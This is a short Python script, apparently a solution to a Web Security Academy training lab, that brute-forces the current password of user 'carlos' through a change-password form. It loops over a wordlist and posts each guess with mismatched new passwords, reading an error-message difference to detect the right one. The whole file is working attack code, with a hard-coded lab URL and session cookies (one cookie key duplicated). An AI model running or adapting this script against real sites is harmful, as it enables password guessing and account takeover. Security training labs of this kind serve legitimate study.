import requests

url = 'https://ac261ff51ff73408c039024b00a6005c.web-security-academy.net/my-account/change-password'

def changePassword():
    passwords = open('../../wordlist/password.txt')

    for password in passwords:
        response = requests.post(url, cookies={
            'session': 'hRXbVvOFm3YynDfuxna1vovWT5SAG4ap',
            'session': 'ghMMph821bOMQILEVJeozwAzgD3IwUlR'
        }, data={
            'username': 'carlos',
            'current-password': password.replace('\n', ''),
            'new-password-1': '123',
            'new-password-2': '1234'
        })

        if 'Current password is incorrect' not in response.text:
            print(response.text)
            print(password)
            break

changePassword()